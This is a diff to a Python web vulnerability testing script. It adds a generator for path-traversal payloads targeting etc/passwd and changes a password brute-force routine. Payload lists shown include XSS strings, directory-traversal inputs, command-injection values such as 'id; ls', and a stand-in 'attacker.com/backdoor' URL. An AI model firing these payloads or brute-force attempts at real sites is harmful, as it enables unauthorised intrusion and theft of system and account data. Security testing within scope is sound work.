@@ -1,6 +1,6 @@
 ######################################################################################################################################################################################################################
 # Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner or manual testing. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
-# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. Placeholders now in place for payload lists..
+# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. Placeholders now in place for payload lists.. Dont forget to test each webpage.
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
 # without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
 # to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
@@ -124,6 +124,15 @@ def load_payloads_from_file(file_path):
     except IOError:
         print(f"Error reading file '{file_path}'. Please check the file path and try again.")
         return None
+
+# Generate LFI payloads with increasing traversal levels
+def generate_lfi_payloads(base_path, max_levels):
+    payloads = []
+    for i in range(1, max_levels + 1):
+        traversal = "../" * i
+        payload = traversal + base_path
+        payloads.append(payload)
+    return payloads
 
 # XSS Testing for both stored and reflected XSS
 def xss_test(url, payloads):
@@ -454,7 +463,7 @@ def header_injection_test(url, payloads):
     log_result("Header Injection Test", "Not Vulnerable", "No header injection detected", url)
 
 # Brute Force Testing for Login Forms
-def brute_force_test(url, username, wordlist, payloads):
+def brute_force_test(url, username, wordlist):
     forms = crawl_for_forms(url)
     with open(wordlist, 'r') as f:
         for password in f.readlines():
@@ -534,7 +543,7 @@ def handle_menu_choice(choice):
     target_url = input("Enter target URL: ")
     payloads = []
 
-    if choice in [2, 3, 4, 5, 6, 7, 8, 9]:
+    if choice in [2, 3, 4, 5, 6, 7, 8]:
         display_payload_menu()
         payload_choice = int(input("Enter your choice: "))
         if payload_choice == 1:
@@ -553,7 +562,7 @@ def handle_menu_choice(choice):
                     "\";alert('XSS');//",
                     "';alert('XSS');",
                     "<iframe src=javascript:alert('XSS')>",
-                  "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
+                    "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
                     "<script>alert(String.fromCharCode(88,83,83))</script>",
                 ]
             elif choice == 3:
@@ -576,11 +585,9 @@ def handle_menu_choice(choice):
                     "http://attacker.com/backdoor"
                 ]
             elif choice == 6:
-                payloads = [
-                    "../../../../etc/passwd",
-                    "../../../../../etc/passwd",
-                    "../../../../../../etc/passwd"
-                ]
+                base_path = "etc/passwd"
+                max_levels = 10
+                payloads = generate_lfi_payloads(base_path, max_levels)
             elif choice == 7:
                 payloads = [
                     "id; ls",
@@ -624,7 +631,7 @@ def handle_menu_choice(choice):
     elif choice == 9:
         username = input("Enter username for brute force/login (if applicable): ")
         wordlist = input("Enter wordlist file path (if applicable): ")
-        brute_force_test(target_url, username, wordlist, payloads)
+        brute_force_test(target_url, username, wordlist)
     elif choice == 10:
         username = input("Enter username for login: ")
         password = input("Enter password for login: ")
